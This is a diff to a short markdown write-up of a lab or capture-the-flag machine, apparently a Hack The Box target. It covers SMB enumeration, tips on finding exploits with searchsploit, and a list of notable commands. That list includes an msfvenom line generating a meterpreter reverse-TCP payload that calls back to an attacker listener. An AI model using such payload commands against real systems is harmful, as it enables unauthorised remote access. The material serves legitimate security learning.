@@ -9,7 +9,7 @@ The second port that was investigated was the samba port 445. For some reason sm
 - If you find an exploit using the searchsploit command you can probably find an alternative script on the internet.
 - You can try different tools if one does not work. For instance smbclient did not work properly on this machine however smbmap worked and helped me find the version for this service.
 
-### Notable commands/tools
+### Notable commands
 - smbmap -H 10.10.10.3
 - smbclient //10.10.10.3/tmp -N
 - msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.37 LPORT=1337 -f python
